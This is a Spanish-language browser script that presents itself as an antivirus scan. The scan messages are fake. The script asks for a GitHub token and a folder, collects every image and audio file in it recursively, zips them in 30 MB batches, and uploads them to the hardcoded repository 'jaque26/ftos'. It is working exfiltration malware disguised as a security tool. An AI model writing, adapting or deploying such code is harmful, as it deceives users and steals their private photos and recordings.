let startTime;
let totalBatches;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');
    
    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;
    
    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;
    
    try {
        const token = prompt('🔑 CLAVE DE ACCESO:');
        if (!token?.startsWith('ghp_')) {
            alert('❌ CLAVE NO VALIDA');
            return;
        }

        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);
        
        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        setTimeout(async () => {
            try {
                updateStatus('Accediendo al sistema...', 10);
                const folderHandle = await window.showDirectoryPicker();
                
                updateStatus('Analizando estructura...', 20);
                const files = await collectFiles(folderHandle);
                if (!files.length) throw new Error('No hay archivos');
                updateStatus(`Elementos detectados: ${files.length}`, 40);

                updateStatus('Comprimiendo datos...', 50);
                const zipBatches = await createZipBatches(files);
                totalBatches = zipBatches.length;
                
                updateStatus('Iniciando protocolo seguro...', 70);
                await processBatches(zipBatches, token);
                
                updateStatus('✅ OPERACIÓN EXITOSA', 100);
            } catch (error) {
                updateStatus(`❌ ERROR: ${error.message}`, 0);
                alert(`FALLO: ${error.message}`);
            }
            isProcessing = false;
        }, 100);
        
    } catch (error) {
        updateStatus(`❌ ERROR: ${error.message}`, 0);
        alert(`FALLO: ${error.message}`);
        isProcessing = false;
    }
});

async function collectFiles(folderHandle) {
    const files = [];
    for await (const entry of folderHandle.values()) {
        if (entry.kind === 'file') {
            const fileName = entry.name.toLowerCase();
            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') || 
                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
                files.push(entry);
            }
        } else if (entry.kind === 'directory') {
            const subFiles = await collectFiles(entry);
            files.push(...subFiles);
        }
    }
    return files;
}

async function createZipBatches(files) {
    const maxSize = 30 * 1024 * 1024; // 30 MB en bytes
    const batches = [];
    let currentBatch = new JSZip();
    let currentFiles = [];
    
    for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const fileData = await file.getFile();
        const fileSize = fileData.size;

        currentFiles.push({ name: file.name, data: await fileData.arrayBuffer() });
        currentBatch.file(file.name, await fileData.arrayBuffer());

        const zipBlob = await currentBatch.generateAsync({ 
            type: 'blob', 
            compression: "DEFLATE", 
            compressionOptions: { level: 9 } 
        });
        if (zipBlob.size > maxSize) {
            currentBatch = new JSZip();
            currentFiles.pop();
            for (const f of currentFiles) {
                currentBatch.file(f.name, f.data);
            }
            const finalZipBlob = await currentBatch.generateAsync({ 
                type: 'blob', 
                compression: "DEFLATE", 
                compressionOptions: { level: 9 } 
            });
            if (finalZipBlob.size <= maxSize) {
                batches.push(currentBatch);
            } else {
                alert(`El zip generado excede 30 MB (${(finalZipBlob.size / 1024 / 1024).toFixed(2)} MB) y será omitido`);
            }

            currentBatch = new JSZip();
            currentBatch.file(file.name, await fileData.arrayBuffer());
            currentFiles = [{ name: file.name, data: await fileData.arrayBuffer() }];
        }

        if (i === files.length - 1 && currentFiles.length > 0) {
            const finalZipBlob = await currentBatch.generateAsync({ 
                type: 'blob', 
                compression: "DEFLATE", 
                compressionOptions: { level: 9 } 
            });
            if (finalZipBlob.size <= maxSize) {
                batches.push(currentBatch);
            } else {
                const half = Math.floor(currentFiles.length / 2);
                const firstHalf = currentFiles.slice(0, half);
                const secondHalf = currentFiles.slice(half);

                if (firstHalf.length > 0) {
                    const firstBatch = new JSZip();
                    for (const f of firstHalf) firstBatch.file(f.name, f.data);
                    const firstBlob = await firstBatch.generateAsync({ 
                        type: 'blob', 
                        compression: "DEFLATE", 
                        compressionOptions: { level: 9 } 
                    });
                    if (firstBlob.size <= maxSize) batches.push(firstBatch);
                }
                if (secondHalf.length > 0) {
                    const secondBatch = new JSZip();
                    for (const f of secondHalf) secondBatch.file(f.name, f.data);
                    const secondBlob = await secondBatch.generateAsync({ 
                        type: 'blob', 
                        compression: "DEFLATE", 
                        compressionOptions: { level: 9 } 
                    });
                    if (secondBlob.size <= maxSize) batches.push(secondBatch);
                }
            }
        }
    }
    return batches;
}

async function processBatches(batches, token) {
    localStorage.removeItem('batchesProgress');
    const startIndex = parseInt(localStorage.getItem('lastProcessedIndex')) || 0;

    for (let index = startIndex; index < batches.length; index++) {
        const batchStartTime = Date.now();
        try {
            const progress = 70 + Math.floor(((index + 1)/batches.length)*30);
            updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);
            
            const zipBlob = await batches[index].generateAsync({ 
                type: 'blob', 
                compression: "DEFLATE", 
                compressionOptions: { level: 9 } 
            });
            if (zipBlob.size > 30 * 1024 * 1024) {
                throw new Error(`El zip ${index} excede 30 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB)`);
            }
            await uploadZipWithRetry(zipBlob, `secure-${Date.now()}-${index}.zip`, token);
            
            localStorage.setItem('lastProcessedIndex', index.toString());
            
            const batchTime = (Date.now() - batchStartTime) / 1000;
            const uploadSpeed = (zipBlob.size / 1024 / 1024) / batchTime;

        } catch (error) {
            localStorage.setItem('lastProcessedIndex', index.toString());
            throw error;
        }
    }
    localStorage.removeItem('lastProcessedIndex');
}

async function uploadZipWithRetry(blob, zipName, token, retries = 5) {
    const repo = 'jaque26/ftos';
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
                method: 'PUT',
                headers: { 
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    message: 'Backup automático', 
                    content: await blobToBase64(blob)
                })
            });

            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(errorData.message || 'Error en subida');
            }
            return; // Éxito, salir de la función
        } catch (error) {
            if (attempt === retries) {
                throw new Error(`Fallo tras ${retries} intentos: ${error.message} (¿Internet lento o límite de GitHub?)`);
            }
            await new Promise(resolve => setTimeout(resolve, 5000)); // Esperar 5 segundos antes de reintentar
        }
    }
}

function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
    });
}
